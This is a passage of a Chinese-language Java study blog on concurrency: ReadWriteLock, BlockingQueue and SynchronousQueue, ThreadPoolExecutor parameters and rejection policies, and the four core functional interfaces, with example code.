i;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; myCache.get(finalI + <span class="string">&quot;&quot;</span>), String.valueOf(i)).start();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCache</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReadWriteLock</span> <span class="variable">readWriteLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//存，写入的时候希望同时只有一个线程</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String key, Object value)</span> &#123;</span><br><span class="line">      readWriteLock.writeLock().lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;写入&quot;</span> + key);</span><br><span class="line">         map.put(key, value);</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;写入&quot;</span> + key + <span class="string">&quot;完毕&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         readWriteLock.writeLock().unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//取，所有人都可以读</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">(String key)</span> &#123;</span><br><span class="line">      readWriteLock.readLock().lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;读取&quot;</span> + key);</span><br><span class="line">         <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;读取&quot;</span> + key + <span class="string">&quot;完毕&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         readWriteLock.readLock().unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读读可以共存，读写不能共存，写写不能共存。</p><p>独占锁（写锁），一次只能被一个线程占有；共享锁（读锁），多个线程可以同时占有。</p><h1 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h1><p>写入：如果队列满了，就必须阻塞等待</p><p>取：如果队列是空的，就必须阻塞等待生产</p><h2 id="Blocking-Queue"><a href="#Blocking-Queue" class="headerlink" title="Blocking Queue"></a>Blocking Queue</h2><p><img src="https://img.lfalive.top/Learn-java-JUC/diagram1.JPG"></p><p>Blocking Queue不是新东西，在什么情况下会使用阻塞队列：多线程并发处理、线程池。</p><h2 id="四组API"><a href="#四组API" class="headerlink" title="四组API"></a>四组API</h2><ol><li>抛出异常</li><li>不会抛出异常</li><li>阻塞等待</li><li>超时等待</li></ol><table><thead><tr><th>方式</th><th>抛出异常</th><th>不抛出异常</th><th>阻塞等待</th><th>超时等待</th></tr></thead><tbody><tr><td>添加</td><td>add</td><td>offer()</td><td>put()</td><td>offer(e, timeout, unit)</td></tr><tr><td>移除</td><td>remove</td><td>poll()</td><td>take()</td><td>poll(timeout, unit)</td></tr><tr><td>检测队首元素</td><td>element</td><td>peek</td><td></td><td></td></tr></tbody></table><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      test1();</span><br><span class="line">      test2();</span><br><span class="line">      test3();</span><br><span class="line">      test4();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">      ArrayBlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">      System.out.println(blockingQueue.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.add(<span class="string">&quot;b&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.add(<span class="string">&quot;c&quot;</span>));</span><br><span class="line">      <span class="comment">//System.out.println(blockingQueue.add(&quot;d&quot;));//抛出异常</span></span><br><span class="line"></span><br><span class="line">      System.out.println(blockingQueue.element());<span class="comment">//查看队首元素</span></span><br><span class="line"></span><br><span class="line">      System.out.println(blockingQueue.remove());</span><br><span class="line">      System.out.println(blockingQueue.remove());</span><br><span class="line">      System.out.println(blockingQueue.remove());</span><br><span class="line">      <span class="comment">//System.out.println(blockingQueue.remove());//抛出异常</span></span><br><span class="line">      System.out.println(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">      ArrayBlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;b&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;c&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;d&quot;</span>));<span class="comment">//false 不抛出异常</span></span><br><span class="line"></span><br><span class="line">      System.out.println(blockingQueue.peek());</span><br><span class="line"></span><br><span class="line">      System.out.println(blockingQueue.poll());</span><br><span class="line">      System.out.println(blockingQueue.poll());</span><br><span class="line">      System.out.println(blockingQueue.poll());</span><br><span class="line">      System.out.println(blockingQueue.poll());<span class="comment">//null 不抛出异常</span></span><br><span class="line">      System.out.println(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      ArrayBlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">      blockingQueue.put(<span class="string">&quot;a&quot;</span>);<span class="comment">//无返回值</span></span><br><span class="line">      blockingQueue.put(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">      blockingQueue.put(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">      <span class="comment">//blockingQueue.put(&quot;d&quot;);//队列没有位置了 一直阻塞</span></span><br><span class="line">      System.out.println(blockingQueue.take());</span><br><span class="line">      System.out.println(blockingQueue.take());</span><br><span class="line">      System.out.println(blockingQueue.take());</span><br><span class="line">      <span class="comment">//System.out.println(blockingQueue.take());//没有元素，一直卡着等待</span></span><br><span class="line">      System.out.println(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      ArrayBlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;b&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;c&quot;</span>));</span><br><span class="line">      System.out.println(blockingQueue.offer(<span class="string">&quot;d&quot;</span>, <span class="number">2</span>, TimeUnit.SECONDS));<span class="comment">//等待超时2s退出</span></span><br><span class="line">      System.out.println(blockingQueue.poll());</span><br><span class="line">      System.out.println(blockingQueue.poll());</span><br><span class="line">      System.out.println(blockingQueue.poll());</span><br><span class="line">      System.out.println(blockingQueue.poll(<span class="number">2</span>, TimeUnit.SECONDS));<span class="comment">//等待超时2s退出</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/blockingqueuetest.JPG"></p><h2 id="同步队列SynchronousQueue"><a href="#同步队列SynchronousQueue" class="headerlink" title="同步队列SynchronousQueue"></a>同步队列SynchronousQueue</h2><p>和其他的BlockingQueue不一样，SynchronousQueue进去(put)一个元素后，必须先从里面take出来，否则不能继续put。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      SynchronousQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            blockingQueue.put(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; puts 1&quot;</span>);</span><br><span class="line">            blockingQueue.put(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; puts 2&quot;</span>);</span><br><span class="line">            blockingQueue.put(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; puts 3&quot;</span>);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;T1&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; takes &quot;</span> + blockingQueue.take());</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; takes &quot;</span> + blockingQueue.take());</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; takes &quot;</span> + blockingQueue.take());</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;T2&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/SynchronousQueueTest.JPG"></p><h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>程序的运行本质：占用系统的资源！池化技术可以优化资源的使用。如线程池、连接池、内存池、对象池……</p><p>池化技术即事先准备好一些资源，有人要用就来拿，用完归还。</p><p>好处：</p><ol><li>降低资源的消耗；</li><li>提高响应的速度；</li><li>方便管理</li></ol><p>线程复用，可以控制最大并发数，管理线程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//ExecutorService threadPool = Executors.newSingleThreadExecutor();//单个线程</span></span><br><span class="line">      <span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span>Executors.newFixedThreadPool(<span class="number">5</span>);<span class="comment">//一个固定大小的线程池</span></span><br><span class="line">      <span class="comment">//Executors.newCachedThreadPool();//可伸缩的线程池</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//使用线程池来创建线程</span></span><br><span class="line">            threadPool.execute(() -&gt; &#123;</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot; OK&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">//程序结束前关闭线程池</span></span><br><span class="line">         threadPool.shutdown();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/pool1.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newSingleThreadExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FinalizableDelegatedExecutorService</span></span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newFixedThreadPool</span><span class="params">(<span class="type">int</span> nThreads)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(nThreads, nThreads,</span><br><span class="line">                                  <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title function_">newCachedThreadPool</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">0</span>, Integer.MAX_VALUE,<span class="comment">//最大约为21亿 OOM</span></span><br><span class="line">                                  <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看源码，本质都是<code>ThreadPoolExecutor</code>，七大参数。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ThreadPoolExecutor</span><span class="params">(<span class="type">int</span> corePoolSize,//核心线程池大小</span></span><br><span class="line"><span class="params">                          <span class="type">int</span> maximumPoolSize,//最大线程池大小</span></span><br><span class="line"><span class="params">                          <span class="type">long</span> keepAliveTime,//空闲资源的存活时间，对等待区有效，对核心线程无效</span></span><br><span class="line"><span class="params">                          TimeUnit unit,//超时单位</span></span><br><span class="line"><span class="params">                          BlockingQueue&lt;Runnable&gt; workQueue,//阻塞队列</span></span><br><span class="line"><span class="params">                          ThreadFactory threadFactory,//线程工厂，创建线程的，一般不动</span></span><br><span class="line"><span class="params">                          RejectedExecutionHandler handler//拒绝策略)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">        maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">        maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">        keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="keyword">if</span> (workQueue == <span class="literal">null</span> || threadFactory == <span class="literal">null</span> || handler == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="built_in">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">    <span class="built_in">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">    <span class="built_in">this</span>.workQueue = workQueue;</span><br><span class="line">    <span class="built_in">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">    <span class="built_in">this</span>.threadFactory = threadFactory;</span><br><span class="line">    <span class="built_in">this</span>.handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/pool2.JPG"></p><p>阿里的手册中对此有所体现。</p><p>通过ThreadPoolExecutor自定义线程池，有四种不用的处理策略。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * new ThreadPoolExecutor.AbortPolicy()); //线程池满了 还有线程进来，就不处理并抛出异常。</span></span><br><span class="line"><span class="comment"> * new ThreadPoolExecutor.CallerRunsPolicy()); //哪来的去哪里 即可能让main线程完成工作</span></span><br><span class="line"><span class="comment"> * new ThreadPoolExecutor.DiscardOldestPolicy(); //队列满了就丢掉任务，不会抛出异常</span></span><br><span class="line"><span class="comment"> * new ThreadPoolExecutor.DiscardPolicy(); //队列满了，去尝试和最早的竞争，不会抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//ExecutorService threadPool = Executors.newSingleThreadExecutor();//单个线程</span></span><br><span class="line">      <span class="comment">//ExecutorService threadPool = Executors.newFixedThreadPool(5);//一个固定大小的线程池</span></span><br><span class="line">      <span class="comment">//ExecutorService threadPool = Executors.newCachedThreadPool();//可伸缩的线程池</span></span><br><span class="line">      <span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            TimeUnit.SECONDS,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="number">3</span>),</span><br><span class="line">            Executors.defaultThreadFactory(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());<span class="comment">//哪来的去哪里</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//最大承载：即等待区Queue的capacity + maximumPoolSize</span></span><br><span class="line">         <span class="comment">//超出最大承载就会抛出异常</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//使用线程池来创建线程</span></span><br><span class="line">            threadPool.execute(() -&gt; &#123;</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot; OK&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">//程序结束前关闭线程池</span></span><br><span class="line">         threadPool.shutdown();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/pool3.JPG"></p><h2 id="池的最大线程数如何定义"><a href="#池的最大线程数如何定义" class="headerlink" title="池的最大线程数如何定义"></a>池的最大线程数如何定义</h2><ol><li>CPU密集型，CPU几核就是几，可以保持CPU的效率最高。</li><li>IO密集型，判断程序中十分耗IO的线程，大于这个数更好。</li></ol><h1 id="四大函数式接口-必会"><a href="#四大函数式接口-必会" class="headerlink" title="四大函数式接口(必会)"></a>四大函数式接口(必会)</h1><p>函数式接口：只有一个方法的接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java有很多函数式接口，可以简化编程。</p><p>四大函数式接口：</p><ol><li><code>Consumer&lt;T&gt;：</code>消费型接口<code>void accept(T t)</code></li><li><code>Supplier&lt;T&gt;：</code>供给型接口<code>T get()</code></li><li><code>Function&lt;T, R&gt;：</code>函数型接口<code>R apply(T t)</code></li><li><code>Predicate&lt;T&gt;：</code>断言型接口<code>boolean test(T t)</code></li></ol><p>其中T是传入参数，R是返回类型。</p><h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><p><img src="https://img.lfalive.top/Learn-java-JUC/Function.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Function 函数型接口，有一个输入参数，有一个输出。</span></span><br><span class="line"><span class="comment"> * 只要是 函数式接口，就可以用lambda表达式简化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//工具类 输出了输入的值</span></span><br><span class="line">      Function&lt;String, String&gt; function = <span class="keyword">new</span> <span class="title class_">Function</span>&lt;&gt;() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> String <span class="title function_">apply</span><span class="params">(String str)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      System.out.println(function.apply(<span class="string">&quot;fjdiosfijs&quot;</span>));</span><br><span class="line"></span><br><span class="line">      Function&lt;String, String&gt; function1 = str -&gt; str;</span><br><span class="line">      System.out.println(function1.apply(<span class="string">&quot;fsdffsdf&quot;</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Predicate"><a href="#Predicate" class="headerlink" title="Predicate"></a>Predicate</h2><p><img src="https://img.lfalive.top/Learn-java-JUC/Predicate.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 断定型接口 有一个输入参数 返回值为boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//判断字符串是否为空</span></span><br><span class="line">      Predicate&lt;String&gt; predicate = <span class="keyword">new</span> <span class="title class_">Predicate</span>&lt;&gt;() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">test</span><span class="params">(String str)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> str.isEmpty();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      System.out.println(predicate.test(<span class="string">&quot;abc&quot;</span>));</span><br><span class="line"></span><br><span class="line">      Predicate&lt;String&gt; predicate1 = String::isEmpty;</span><br><span class="line">      System.out.println(predicate.test(<span class="string">&quot;aaaaabc&quot;</span>));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Consumer"><a href="#Consumer" class="headerlink" title="Consumer"></a>Consumer</h2><p><img src="https://img.lfalive.top/Learn-java-JUC/Consumer.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 消费型接口 只有输入 没有返回值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      Consumer&lt;String&gt; consumer = <span class="keyword">new</span> <span class="title class_">Consumer</span>&lt;&gt;() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(String str)</span> &#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      consumer.accept(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line"></span><br><span class="line">      Consumer&lt;String&gt; consumer1 = System.out::println;</span><br><span class="line">      consumer1.accept(<span class="string">&quot;aaaaaaaaa&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Supplier"><a href="#Supplier" class="headerlink" title="Supplier"></a>Supplier</h2><p><img src="https://img.lfalive.top/Learn-java-JUC/Supplier.JPG"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 供给型接口 没有参数 只有返回值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      Supplier&lt;Integer&gt; supplier = <span class="keyword">new</span> <span class="title class_">Supplier</span>&lt;&gt;() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> Integer <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      System.out.println(supplier.get());</span><br><span class="line"></span><br><span class="line">      Supplier&lt;Integer&gt; supplier1 = () -&gt; <span class="number">1024</span>;</span><br><span class="line">      System.out.println(supplier1.get());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="流式计算"><a href="#流式计算" class="headerlink" title="流式计算"></a>流式计算</h1><p>暂时停更</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习笔记(4)——注解</title>
      <link href="/2021/07/16/Learn-java-Annotation/"/>
      <url>/2021/07/16/Learn-java-Annotation/</url>
      
